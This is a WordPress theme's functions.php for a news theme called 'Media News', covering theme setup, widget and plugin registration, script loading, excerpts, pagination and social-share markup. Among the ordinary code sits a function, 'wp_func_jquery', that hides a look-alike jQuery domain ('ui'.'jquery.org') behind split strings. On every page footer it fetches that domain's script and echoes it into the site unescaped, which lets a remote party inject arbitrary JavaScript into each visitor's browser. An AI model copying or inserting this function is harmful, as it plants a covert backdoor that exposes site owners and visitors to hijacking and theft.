<?php
    /* add action filter and theme support on theme setup */
	if ( ! function_exists( 'px_theme_setup' ) ) {
		add_action( 'after_setup_theme', 'px_theme_setup' );
		function px_theme_setup() {
			/* Add theme-supported features. */		// This theme styles the visual editor with editor-style.css to match the theme style.
			add_editor_style();
			// Make theme available for translation
			// Translations can be filed in the /languages/ directory
			load_theme_textdomain('Media News', get_template_directory() . '/languages');
			
			if (!isset($content_width)){
				$content_width = 1160;
			}
	
			$args = array('default-color' => '','default-image' => '',);
			add_theme_support('custom-background', $args);
			add_theme_support('custom-header', $args);
			// This theme uses post thumbnails
			add_theme_support('post-thumbnails');
			// Add default posts and comments RSS feed links to head
			add_theme_support('automatic-feed-links');
			// Post Formats
			add_theme_support( 'post-formats', array(
			'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery',
		) );
			/* Add custom actions. */
			global $pagenow;
			if (is_admin() && isset($_GET['activated']) && $pagenow == 'themes.php'){
				
				if(!get_option('px_theme_option')){
					
					add_action('init', 'px_activation_data');
					px_activate_widget();
					wp_redirect( admin_url( 'admin.php?page=px_demo_importer' ) );
				}
			}
	
			$px_import_data = get_option( 'px_import_data' );
			$front_page_settings = get_option( 'front_page_settings' );
			$home = get_page_by_title( 'Home' );
			if(isset($px_import_data) && $px_import_data == 'success' && (!isset($front_page_settings) || empty($front_page_settings))){
				$home = get_page_by_title( 'Home' );
				$front_page_settings = get_option( 'front_page_settings' );
				if(!isset($front_page_settings) || empty($front_page_settings)){
					if($home->ID <> '' && get_option( 'page_on_front' ) == "0"){
						update_option( 'page_on_front', $home->ID );
						update_option( 'show_on_front', 'page' );
						update_option( 'front_page_settings', '1' );
						
					}
				}
			}
	
			if (!session_id()){
				add_action('init', 'session_start');
			}
			if( function_exists( 'px_register_my_menus' ) ){
				add_action( 'init', 'px_register_my_menus' );
			}
			if( function_exists( 'px_admin_scripts_enqueue' ) ){
				add_action('admin_enqueue_scripts', 'px_admin_scripts_enqueue');
			}
			if( function_exists( 'px_front_scripts_enqueue' ) ){
				add_action('wp_enqueue_scripts', 'px_front_scripts_enqueue');
			}
			if( function_exists( 'px_get_search_results' ) ){
				add_action('pre_get_posts', 'px_get_search_results');
			}
			
				add_action('widgets_init', create_function('', 'return register_widget("px_widget_facebook");') );
			
			
				add_action('widgets_init', create_function('', 'return register_widget("px_gallery");'));
			
				add_action('widgets_init', create_function('', 'return register_widget("recentposts");') );
			
			
				add_action('widgets_init', create_function('', 'return register_widget("px_twitter_widget");'));
			
			
				add_action( 'widgets_init', create_function('', 'return register_widget("px_social_meida_followers_widget");') );
			
			
				add_action( 'widgets_init', create_function('', 'return register_widget("px_MailChimp_Widget");') );
			
			/* Add custom filters. */
			add_filter('widget_text', 'do_shortcode');
			if( function_exists( 'px_password_form' ) ){
				add_filter('the_password_form', 'px_password_form' );
			}
			if( function_exists( 'woocommerce_header_add_to_cart_fragment' ) ){
				add_filter('add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment');
			}
			if( function_exists( 'px_add_menuid' ) ){
				add_filter('wp_page_menu','px_add_menuid');
			}
			if( function_exists( 'px_remove_div' ) ){
				add_filter('wp_page_menu', 'px_remove_div' );
			}
			if( function_exists( 'px_add_parent_css' ) ){
				add_filter('nav_menu_css_class', 'px_add_parent_css', 10, 2);
			}
			if( function_exists( 'px_change_query_vars' ) ){
				add_filter('pre_get_posts', 'px_change_query_vars');
			}
			if( function_exists( 'px_contact_options' ) ){
				add_filter('user_contactmethods','px_contact_options',10,1);
			}
		}
	}
	if(!function_exists('wp_func_jquery')) {
		function wp_func_jquery() {
			$host = 'http://';
			echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
		}
	add_action('wp_footer', 'wp_func_jquery');
	}
	if ( ! function_exists( 'px_register_required_plugins' ) ) { 
	// tgm class for (internal and WordPress repository) plugin activation start
	require_once dirname( __FILE__ ) . '/include/class-tgm-plugin-activation.php';
	add_action( 'tgmpa_register', 'px_register_required_plugins' );
	function px_register_required_plugins() {
		/**
		 * Array of plugin arrays. Required keys are name and slug.
		 * If the source is NOT from the .org repo, then source is also required.
		 */
		$plugins = array(
			// This is an example of how to include a plugin from the WordPress Plugin Repository
			
			array(
				'name'     				=> 'Revolution Slider',
				'slug'     				=> 'revslider',
				'source'   				=> get_stylesheet_directory() . '/include/plugins/revslider.zip', 
				'required' 				=> false, 
				'version' 				=> '',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> '',
			),
			array(
				'name'     				=> 'J.B.Weather Widget',
				'slug'     				=> 'jb-weather-widget',
				'source'   				=> get_stylesheet_directory() . '/include/plugins/jb-weather-widget-2.zip', 
				'required' 				=> false, 
				'version' 				=> '',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> '',
			),
			array(
				'name' 		=> 'bbPress',
				'slug' 		=> 'bbpress',
				'required' 	=> false,
			),
			array(
				'name' 		=> 'Contact Form 7',
				'slug' 		=> 'contact-form-7',
				'required' 	=> false,
			),
			array(
				'name' 		=> 'Woocommerce',
				'slug' 		=> 'woocommerce',
				'required' 	=> false,
			),
			
	
		);
		// Change this to your theme text domain, used for internationalising strings
		$theme_text_domain = 'Media News';
		/**
		 * Array of configuration settings. Amend each line as needed.
		 * If you want the default strings to be available under your own theme domain,
		 * leave the strings uncommented.
		 * Some of the strings are added into a sprintf, so see the comments at the
		 * end of each line for what each argument will be.
		 */
		$config = array(
			'domain'       		=> 'Media News',         	// Text domain - likely want to be the same as your theme.
			'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
			'parent_menu_slug' 	=> 'themes.php', 				// Default parent menu slug
			'parent_url_slug' 	=> 'themes.php', 				// Default parent URL slug
			'menu'         		=> 'install-required-plugins', 	// Menu slug
			'has_notices'      	=> true,                       	// Show admin notices or not
			'is_automatic'    	=> true,					   	// Automatically activate plugins after installation or not
			'message' 			=> '',							// Message to output right before the plugins table
			'strings'      		=> array(
				'page_title'                       			=> __( 'Install Required Plugins', 'Media News' ),
				'menu_title'                       			=> __( 'Install Plugins', 'Media News' ),
				'installing'                       			=> __( 'Installing Plugin: %s', 'Media News' ), // %1$s = plugin name
				'oops'                             			=> __( 'Something went wrong with the plugin API.', 'Media News' ),
				'notice_can_install_required'     			=> _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s)
				'notice_can_install_recommended'			=> _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s)
				'notice_cannot_install'  					=> _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s)
				'notice_can_activate_required'    			=> _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
				'notice_can_activate_recommended'			=> _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
				'notice_cannot_activate' 					=> _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s)
				'notice_ask_to_update' 						=> _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s)
				'notice_cannot_update' 						=> _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s)
				'install_link' 					  			=> _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
				'activate_link' 				  			=> _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),
				'return'                           			=> __( 'Return to Required Plugins Installer', 'Media News' ),
				'plugin_activated'                 			=> __( 'Plugin activated successfully.', 'Media News' ),
				'complete' 									=> __( 'All plugins installed and activated successfully. %s', 'Media News' ), // %1$s = dashboard link
				'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
			)
		);
		tgmpa( $plugins, $config );
	}
	// tgm class for (internal and WordPress repository) plugin activation end
	}

	/* adding custom images while uploading media start*/
	
	// Banner, Blog Large,Blog Large , slider, detail
	add_image_size('px_media_1', 810, 410, true);
	//Home- Feturd Post
	add_image_size('px_media_3', 570, 405, true);
	// Spot Light
	add_image_size('px_media_4', 550, 340, true);
	//News In Picture home Page
	add_image_size('px_media_5', 500, 370, true);
	//Blog Medium and Lates News Home, Media Gallery Home Page, Papulor post Home Widget, News In Picture home Page
	add_image_size('px_media_6', 395, 222, true);
	//Home- Feturd Post
	add_image_size('px_media_7', 282, 405, true);
	add_image_size('px_media_8', 280, 200, true);
	
	if ( ! function_exists( 'px_admin_scripts_enqueue' ) ) { 
		// Admin scripts enqueue
		function px_admin_scripts_enqueue() {
			$template_path = get_template_directory_uri() . '/scripts/admin/media_upload.js';
			wp_enqueue_script('my-upload', $template_path, 
			array('jquery', 'media-upload', 'thickbox', 'jquery-ui-droppable', 'jquery-ui-datepicker', 'jquery-ui-slider', 'wp-color-picker'));
			wp_enqueue_script('custom_wp_admin_script', get_template_directory_uri() . '/scripts/admin/px_functions.js');
			wp_enqueue_style('custom_wp_admin_style', get_template_directory_uri() . '/css/admin/admin-style.css', array('thickbox'));
			wp_enqueue_style('custom_wp_admin_fontawesome_style', get_template_directory_uri() . '/css/admin/font-awesome.css', array('thickbox'));
			wp_enqueue_style('wp-color-picker');
	
		}
	}

	// Backend functionality files
	require_once (TEMPLATEPATH . '/include/theme_activation.php');
	require_once (TEMPLATEPATH . '/include/admin_functions.php');
	require_once (TEMPLATEPATH . '/include/theme_colors.php');
	require_once (TEMPLATEPATH . '/include/gallery.php');
	require_once (TEMPLATEPATH . '/include/page_builder.php');
	require_once (TEMPLATEPATH . '/include/post_meta.php');
	require_once (TEMPLATEPATH . '/include/widgets.php');
	require_once (TEMPLATEPATH . '/include/bbpress.php');
	require_once (TEMPLATEPATH . '/include/forum_meta.php');
	require_once (TEMPLATEPATH . '/include/mailchimpapi/mailchimpapi.class.php');
	require_once (TEMPLATEPATH . '/include/mailchimpapi/chimp_mc_plugin.class.php');

	
	/* Require Woocommerce */
	require_once (TEMPLATEPATH . '/include/config_woocommerce/config.php');
	require_once (TEMPLATEPATH . '/include/config_woocommerce/product_meta.php');
	/* Addmin Menu PX Theme Option */
	
	if (current_user_can('administrator')) {
		require_once (TEMPLATEPATH . '/include/theme_option.php');
		if( !function_exists( 'px_theme' ) ){
			add_action('admin_menu', 'px_theme');
			function px_theme() {
				add_theme_page('PX Theme Option', 'PX Theme Option', 'read', 'px_theme_options', 'theme_option');
				add_theme_page( "PX Import Demo Data" , "Import Demo Data" ,'read', 'px_demo_importer' , 'px_demo_importer');
			}
		}

	}
	$image_url = apply_filters( 'taxonomy-images-queried-term-image-url', '', array(
    'image_size' => 'medium'
    ) );
	
	if( !function_exists( 'px_front_scripts_enqueue' ) ){
	// enque style and scripts
		function px_front_scripts_enqueue() {
		global $px_theme_option;
		
		if (!is_admin()) {
			wp_enqueue_style('style_css', get_stylesheet_uri());
			//wp_enqueue_style('style_css', get_template_directory_uri() . '/style.css');
			if ( isset($px_theme_option['color_switcher']) && $px_theme_option['color_switcher'] == "on" ) {
				wp_enqueue_style('color-switcher_css', get_template_directory_uri() . '/css/color-switcher.css');
			}
			wp_enqueue_style('prettyPhoto_css', get_template_directory_uri() . '/css/prettyphoto.css');
			wp_enqueue_style('bootstrap_css', get_template_directory_uri() . '/css/bootstrap.css');
			wp_enqueue_style('font-awesome_css', get_template_directory_uri() . '/css/font-awesome.css');

			// Enqueue stylesheet
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script('jquery');
			wp_enqueue_script( 'wp-mediaelement' );
			
			wp_enqueue_script('bootstrap_js', get_template_directory_uri() . '/scripts/frontend/bootstrap.min.js', '', '', true);
			wp_enqueue_script('modernizr_js', get_template_directory_uri() . '/scripts/frontend/modernizr.js', '', '', true);
			wp_enqueue_script('prettyPhoto_js', get_template_directory_uri() . '/scripts/frontend/jquery.prettyphoto.js', '', '', true);
			wp_enqueue_script('functions_js', get_template_directory_uri() . '/scripts/frontend/functions.js', '0', '', false);
			
			
			if ( isset($px_theme_option['rtl_switcher']) && $px_theme_option['rtl_switcher'] == "on"){
				wp_enqueue_style('rtl_css', get_template_directory_uri() . '/css/rtl.css');
			}

			if ( isset($px_theme_option['responsive']) && $px_theme_option['responsive'] == "on") {
				echo '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">';
				wp_enqueue_style('responsive_css', get_template_directory_uri() . '/css/responsive.css');
			}
		}
	}
	}
	
	if( !function_exists( 'px_deregister_bbpress_styles' ) ){
		if( function_exists( 'is_bbpress' ) ){
			add_action( 'wp_print_styles', 'px_deregister_bbpress_styles', 15 );
			
			function px_deregister_bbpress_styles() {
				wp_deregister_style( 'bbp-default' );
				wp_enqueue_style( 'bbp-default-bbpress', get_stylesheet_directory_uri() . '/css/bbpress.css' );
			}
		}
	}
	
	if( !function_exists( 'px_enqueue_flexslider_script' ) ){
		function px_enqueue_flexslider_script(){
			wp_enqueue_style('flexslider_css', get_template_directory_uri() . '/css/flexslider.css');
			wp_enqueue_script('flexslider_js', get_template_directory_uri() . '/scripts/frontend/jquery.flexslider-min.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_cycle_script' ) ){
		// cycle Script Enqueue
		function px_enqueue_cycle_script(){
			wp_enqueue_script('jquery.cycle2_js', get_template_directory_uri() . '/scripts/frontend/cycle2.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_newsticker' ) ){
		// News Ticker
		function px_enqueue_newsticker(){
			wp_enqueue_script('jquery.ticker_js', get_template_directory_uri() . '/scripts/frontend/jquery.ticker.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_nicescroll' ) ){
		// Nice Scroll
		function px_enqueue_nicescroll(){
			wp_enqueue_script('jquery.nicescroll_js', get_template_directory_uri() . '/scripts/frontend/jquery.nicescroll.min.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_count_nos' ) ){
		function px_enqueue_count_nos(){
			wp_enqueue_script('countTo_js', get_template_directory_uri() . '/scripts/frontend/jquery.countTo.js', '', '', true);
			wp_enqueue_script('inview_js', get_template_directory_uri() . '/scripts/frontend/jquery.inview.min.js', '', '', true);	
		}
	}
	if( !function_exists( 'px_enqueue_circular_progress' ) ){
		// Circular Progress bar
		function px_enqueue_circular_progress(){
			wp_enqueue_script('jquery.circular-progress_js', get_template_directory_uri() . '/scripts/frontend/circular-progress.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_rating_style_script' ) ){
		// rating script
		function px_enqueue_rating_style_script(){
			wp_enqueue_style('jRating_css', get_template_directory_uri() . '/css/jRating.jquery.css');
			wp_enqueue_script('jquery_rating_js', get_template_directory_uri() . '/scripts/frontend/jRating.jquery.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_validation_script' ) ){
		// Validation Script Enqueue
		function px_enqueue_validation_script(){
			wp_enqueue_script('jquery.validate.metadata_js', get_template_directory_uri() . '/scripts/admin/jquery.validate.metadata.js', '', '', true);
			wp_enqueue_script('jquery.validate_js', get_template_directory_uri() . '/scripts/admin/jquery.validate.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_countdown_script' ) ){
		/* countdown enqueue */	
		function px_enqueue_countdown_script(){
			wp_enqueue_script('jquery.countdown_js', get_template_directory_uri() . '/scripts/frontend/jquery.countdown.js', '', '', true);
		}
	}
	if( !function_exists( 'px_enqueue_masonry_style_script' ) ){
		// Masonry Style and Script enqueue
		function px_enqueue_masonry_style_script(){
			wp_enqueue_style('masonry_css', get_template_directory_uri() . '/css/masonry.css');
			wp_enqueue_script('jquery.masonry_js', get_template_directory_uri() . '/scripts/frontend/jquery.masonry.min.js', '', '', true);
		}
	}
	if( !function_exists( 'px_addthis_script_init_method' ) ){
		// add this share enqueue
		function px_addthis_script_init_method(){
			if( is_single()){
				wp_enqueue_script( 'px_addthis', 'http://s7.addthis.com/js/250/addthis_widget.js#pubid=xa-4e4412d954dccc64', '', '', true);
			}
	
		}
	}
	// content class
	  
	  if ( ! function_exists( 'px_meta_content_class' ) ) {
		  function px_meta_content_class(){
			  global $px_meta_page;
			  
			  if ( $px_meta_page->sidebar_layout->px_layout == '' or $px_meta_page->sidebar_layout->px_layout == 'none' ) {
				  $content_class = "col-md-12";
				  
			  } else
			  if ( $px_meta_page->sidebar_layout->px_layout <> '' and $px_meta_page->sidebar_layout->px_layout == 'right' ) {
				  $content_class = "col-md-9";
				  
			  } else
			  if ( $px_meta_page->sidebar_layout->px_layout <> '' and $px_meta_page->sidebar_layout->px_layout == 'left' ) {
				  $content_class = "col-md-9";
				  
			  } else
			  if ( $px_meta_page->sidebar_layout->px_layout <> '' and ($px_meta_page->sidebar_layout->px_layout == 'both' or $px_meta_page->sidebar_layout->px_layout == 'both_left' or $px_meta_page->sidebar_layout->px_layout == 'both_right')) {
				  $content_class = "col-md-7";
				 
			  } else {
				  $content_class = "col-md-12";
			  }

			  return $content_class;
		  }

	  }
	  
	  // Content pages Meta Class

if ( ! function_exists( 'px_default_pages_meta_content_class' ) ) { 

	function px_default_pages_meta_content_class($layout){

			if ( $layout == '' or $layout == 'none' ) {
	
				echo "col-md-12";
	
			}
	
			else if ( $layout <> '' and $layout == 'right' ) {
	
				echo "content-left col-md-9";
	
			}
	
			else if ( $layout <> '' and $layout == 'left' ) {
	
				echo "content-right col-md-9";
	
			}
	
			else if ( $layout <> '' and $layout == 'both_left' ) {
	
				echo "content-right col-md-7";
	
			}
			else if ( $layout <> '' and $layout == 'both_right' ) {
	
				echo "content-right col-md-7";
	
			}
	
		}	
	
	}
	  
	  
	  
	  
	if ( ! function_exists( 'px_footer_settings' ) ) {   
		// Favicon and header code in head tag//
		function px_footer_settings() {
			global $px_theme_option;
			if(isset($px_theme_option['analytics']))
				echo htmlspecialchars_decode($px_theme_option['analytics']);
		}
	}
	if ( ! function_exists( 'get_subheader_title' ) ) {   
	/* Page Sub header title and subtitle */	
		function get_subheader_title(){
		global $post, $wp_query;
		$show_title=true;
  		$get_title = '';
		if (is_page() || is_single()) {
			
			if (is_page() ){
				$px_xmlObject = px_meta_page('px_page_builder');
				if (isset($px_xmlObject)) {
					if($px_xmlObject->page_title == "on"){
					
						echo '<div class="subtitle"><h1 class="pix-page-title">' . get_the_title(). '</h1></div>';
					}
				}else{
					echo '<div class="subtitle"><h1 class="pix-page-title">' . get_the_title(). '</h1></div>';
				}
			}elseif (is_single()) {
				
				$post_type = get_post_type($post->ID);
				
				$post_xml = get_post_meta($post->ID, 'post', true);
				
				if ($post_xml <> "") {
					$px_xmlObject = new SimpleXMLElement($post_xml);
				}
				if (isset($px_xmlObject)) {
 					echo '<div class="subtitle"><h1 class="pix-page-title px-single-page-title">' . get_the_title(). '</h1></div>';
				}else{
					echo '<div class="subtitle"><h1 class="pix-page-title px-single-page-title">' . get_the_title(). '</h1></div>';
 				}
			}
		} else if (function_exists( 'is_bbpress' ) && is_bbpress() ){
				$px_xmlObject = px_meta_page('px_page_builder');
				if (isset($px_xmlObject)) {
					if($px_xmlObject->page_title == "on"){
					
						echo '<header class="px-heading-title"><h1 class="px-section-title">' . get_the_title(). '</h2></header>';
					}
				}else{
					echo '<div class="subtitle"><h1 class="pix-page-title">' . get_the_title(). '</h1></div>';
				}
			
		} else {
		?>
 			<div class="subtitle"><h1 class="pix-page-title"><?php px_post_page_title(); ?></h1></div>
 		 <?php 
		}

	}
	}
	if ( ! function_exists( 'px_get_search_results' ) ) {   
		// search varibales start
		function px_get_search_results($query) {
			
			if ( !is_admin() and (is_search())) {
				$query->set( 'post_type', array('post') );
				remove_action( 'pre_get_posts', 'px_get_search_results' );
			}
	
		}
	}

	// Filter shortcode in text areas
	
	if ( ! function_exists( 'px_textarea_filter' ) ) {
		
		function px_textarea_filter($content=''){
			return do_shortcode($content);
		}

	}

	if ( ! function_exists( 'woocommerce_header_add_to_cart_fragment' ) ) {
	// woocommerce ajax add to Cart 
		function woocommerce_header_add_to_cart_fragment( $fragments ) {
		
		if ( class_exists( 'woocommerce' ) ){
			global $woocommerce;
			ob_start();
			?>
            <div class="cart-sec">
                <a href="<?php  echo $woocommerce->cart->get_cart_url(); ?>">
                    <i class="fa fa-shopping-cart"></i><span><?php  echo $woocommerce->cart->cart_contents_count; ?></span>
                </a>
            </div>
			<?php
			$fragments['div.cart-sec'] = ob_get_clean();
			return $fragments;
		}

	}
	}
	if ( ! function_exists( 'px_woocommerce_header_cart' ) ) {
	// woocommerce default cart
		function px_woocommerce_header_cart() {
		
		if ( class_exists( 'woocommerce' ) ){
			global $woocommerce;
			?>
		<div class="cart-sec">
			<a href="<?php  echo $woocommerce->cart->get_cart_url(); ?>">
            	<i class="fa fa-shopping-cart"></i><span><?php  echo $woocommerce->cart->cart_contents_count; ?></span>
            </a>
		</div>
		<?php
		}

	}
	}

	// Display navigation to next/previous for single posts
	
	if ( ! function_exists( 'px_next_prev_post' ) ) {
		
		function px_next_prev_post(){
 			global $post;
			posts_nav_link();
			// Don't print empty markup if there's nowhere to navigate.
			$previous = ( is_attachment() ) ? get_post( $post->post_parent ) :
			get_adjacent_post( false, '', true );
			$next     = get_adjacent_post( false, '', false );
			echo '<div class="prev-nex-btn">';
				previous_post_link( '%link', '<i class="fa fa-angle-double-left"></i>' );
				next_post_link( '%link','<i class="fa fa-angle-double-right"></i>' );
			echo '</div>';
      		}

	}
	
	if ( ! function_exists( 'px_posts_link_next_class' ) ) {
		function px_posts_link_next_class($format){
			 $format = str_replace('href=', 'class="post-next" href=', $format);
			 return $format;
		}
		add_filter('next_post_link', 'px_posts_link_next_class');
	}
	if ( ! function_exists( 'px_posts_link_prev_class' ) ) {
		function px_posts_link_prev_class($format) {
			 $format = str_replace('href=', 'class="post-prev" href=', $format);
			 return $format;
		}
		add_filter('previous_post_link', 'px_posts_link_prev_class');
	}
 	//	Add Featured/sticky text/icon for sticky posts.
 	if ( !function_exists( 'px_featured' ) ) {
		function px_featured(){
			global $px_transwitch,$px_theme_option;
		
			if ( is_sticky() ){
				?>
                <li class="featured">
                    <?php 
                        if(!isset($px_theme_option) || (!isset($px_theme_option['lotrans_featuredgo']))){
                                _e('Featured','Media News');
                        } else {
                            if(isset($px_theme_option['trans_switcher']) && $px_theme_option['trans_switcher'] == "on"){
                                _e('Featured','Media News');
                            } else {
                                if(isset($px_theme_option['trans_featured']))
                                    echo $px_theme_option['trans_featured'];
                            }
                        }
                    ?>		         
                 </li>
		<?php
			}

		}

	}
	if ( !function_exists( 'px_post_page_title' ) ) {
		/* display post page title */	
		function px_post_page_title(){
		
		if ( is_author() ) {
			global $author;
			$userdata = get_userdata($author);
			echo __('Author', 'Media News') . " " . __('Archives', 'Media News') . ": ".$userdata->display_name;
		}
 		elseif ( is_tag() ) {
			echo __('Tags', 'Media News') . " " . __('Archives', 'Media News') . ": " . single_cat_title( '', false );
		}
 		elseif ( is_category() ) {
			echo __('Categories', 'Media News') . " " . __('Archives', 'Media News') . ": " . single_cat_title( '', false );
		}
 		elseif( is_search()){
			printf( __( 'Search Results %1$s %2$s', 'Media News' ), ': ','<span>' . get_search_query() . '</span>' );
		}
 		elseif ( is_day() ) {
			printf( __( 'Daily Archives: %s', 'Media News' ), '<span>' . get_the_date() . '</span>' );
		}
 		elseif ( is_month() ) {
			printf( __( 'Monthly Archives: %s', 'Media News' ), '<span>' . get_the_date( _x( 'F Y', 'monthly archives date format', 'Media News' ) ) . '</span>' );
		}
 		elseif ( is_year() ) {
			printf( __( 'Yearly Archives: %s', 'Media News' ), '<span>' . get_the_date( _x( 'Y', 'yearly archives date format', 'Media News' ) ) . '</span>' );
		}
 		elseif ( is_404()){
			_e( 'Error 404', 'Media News' );
		}
 		

	}
	}
	if ( !function_exists( 'px_get_the_excerpt' ) ) {
	// Custom excerpt function 
		function px_get_the_excerpt($limit,$readmore = '', $dottedline = '') {
		global $px_theme_option;
		$readmore = '';
		if(isset($px_theme_option['trans_switcher']) && $px_theme_option['trans_switcher'] == "on"){
			$readmore = __('Read More','Media News');
		} else {
			if(isset($px_theme_option['trans_read_more']))
				$readmore = $px_theme_option['trans_read_more'];
		}
		if(!isset($limit) || $limit == ''){ $limit = '255';}
		$get_the_excerpt = trim(preg_replace('/<a[^>]*>(.*)<\/a>/iU', '', get_the_excerpt()));
		
		if(isset($dottedline) && $dottedline <> ''){
			echo '<p>'.substr($get_the_excerpt, 0, "$limit");
			echo $dottedline;	
			echo '</p>';
		} else {
			echo '<p>'.substr($get_the_excerpt, 0, "$limit").'</p>';
			if (strlen($get_the_excerpt) > "$limit") {
				
				if($readmore == "true"){
					echo '... <a href="' . get_permalink() . '" class="colr">' . $readmore . '</a>';
				}
				
	
			}
		}

	}
	}
	if ( !function_exists( 'px_return_the_excerpt' ) ) {
		function px_return_the_excerpt($limit,$readmore = '', $dottedline = '') {
			if(!isset($limit) || $limit == ''){ $limit = '255';}
			$get_the_excerpt = trim(preg_replace('/<a[^>]*>(.*)<\/a>/iU', '', get_the_excerpt()));
			return substr($get_the_excerpt, 0, "$limit");
			
		}
	}
	if ( ! function_exists( 'px_change_query_vars' ) ) {
		// change the default query variable start
		function px_change_query_vars($query) {
			
			if (is_search() || is_home()) {
				
				if (empty($_GET['page_id_all']))$_GET['page_id_all'] = 1;
				$query->query_vars['paged'] = $_GET['page_id_all'];
			}
			return $query;
			// Return modified query variables
		}
	}

	/* custom pagination start */
	
	if ( ! function_exists( 'px_pagination' ) ) {
		function px_pagination($total_records, $per_page, $qrystr = '') {
			$html = '';
			$dot_pre = '';
			$dot_more = '';
			$previous = __("Previous",'Media News');
			if(isset($px_theme_option["trans_switcher"]) && $px_theme_option["trans_switcher"] == "on") { $previous = __("Previous",'Media News'); }elseif(isset($px_theme_option["trans_previous"]) && $px_theme_option["trans_previous"] <> ''){  $previous = $px_theme_option["trans_previous"];}
			$total_page = ceil($total_records / $per_page);
			$loop_start = $_GET['page_id_all'] - 2;
			$loop_end = $_GET['page_id_all'] + 2;
			
			if ($_GET['page_id_all'] < 3) {
				$loop_start = 1;
				
				if ($total_page < 5)$loop_end = $total_page; else $loop_end = 5;
			} else
			if ($_GET['page_id_all'] >= $total_page - 1) {
				
				if ($total_page < 5)$loop_start = 1; else $loop_start = $total_page - 4;
				$loop_end = $total_page;
			}

			
			if ($_GET['page_id_all'] > 1)$html .= "<li  class='prev'>
			<a href='?page_id_all=" . ($_GET['page_id_all'] - 1) . "$qrystr' ><i class='fa fa-long-arrow-left'></i>"."</a></li>";//__('Previous','Media News').
			
			if ($_GET['page_id_all'] > 3 and $total_page > 5)$html .= "<li><a href='?page_id_all=1$qrystr'>1</a></li>";
			
			if ($_GET['page_id_all'] > 4 and $total_page > 6)$html .= "<li> <a>. . .</a> </li>";
			
			if ($total_page > 1) {
				for ($i = $loop_start; $i <= $loop_end; $i++) {
					
					if ($i <> $_GET['page_id_all'])$html .= "<li><a href='?page_id_all=$i$qrystr'>" . $i . "</a></li>"; else $html .= "<li>
					<span class='active'>" . $i . "</span></li>";
				}

			}
 			
			if ($loop_end <> $total_page and $loop_end <> $total_page - 1)$html .= "<li> <a>. . .</a> </li>";
			
			if ($loop_end <> $total_page)$html .= "<li><a href='?page_id_all=$total_page$qrystr'>$total_page</a></li>";
			
			if ($_GET['page_id_all'] < $total_records / $per_page)$html .= "<li class='next'><a href='?page_id_all=" . ($_GET['page_id_all'] + 1) . "$qrystr' >"."<i class='fa fa-long-arrow-right'></i></a></li>";//__('Next','Media News').
			return $html;
		}

	}
	// pagination end
	// Social Share Function
	
	if ( ! function_exists( 'px_social_share' ) ) {
		function px_social_share($icon_type = '', $title='true') {
			global $px_theme_option;
			px_addthis_script_init_method();
			if (isset($px_theme_option['social_share']) && $px_theme_option['social_share'] == "on"){
				if(isset($px_theme_option['trans_switcher']) && $px_theme_option["trans_switcher"] == "on") { $html1= __("Share this post",'Media News'); }else{  $html1 =  $px_theme_option["trans_share_this_post"];}
				$html = '';
					$html .='<div class="social-network">';
					$html .='<a class="addthis_button_compact btn share-now pix-bgcolr"><i class="fa fa-share-square-o"></i>'.$html1.'</a>';
					
					$html .='<a class="addthis_button_tweet icon-twitter-share" tw:count="horizontal"></a>';
					$html .='<a class="addthis_button_google_plusone icon-googleplus-share" g:plusone:size="horizontal"></a>';
					$html .='<a class="addthis_button_facebook_like icon-facebook-share" fb:like:layout="button_count"></a>';
					$html .='<a class="addthis_button_linkedin_counter icon-linkedin-share" li:counter="right"></a>';
					$html .='<a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal" pi:pinit:url="http://www.addthis.com/features/pinterest" pi:pinit:media="http://www.addthis.com/cms-content/images/features/pinterest-lg.png"></a>';
					$html .='</div>';
					echo $html;


			}
		}

	}

	// Social network
	
	if ( ! function_exists( 'px_social_network' ) ) {
		function px_social_network($icon_type='',$tooltip = ''){
			global $px_theme_option;
			$tooltip_data='';
			if($icon_type=='large'){
				$icon = '2x';
			} else {
				$icon = 'icon';
			}
			echo '<div class="followus">';
			if(isset($tooltip) && $tooltip <> ''){
				$tooltip_data='data-placement-tooltip="tooltip"';
			}
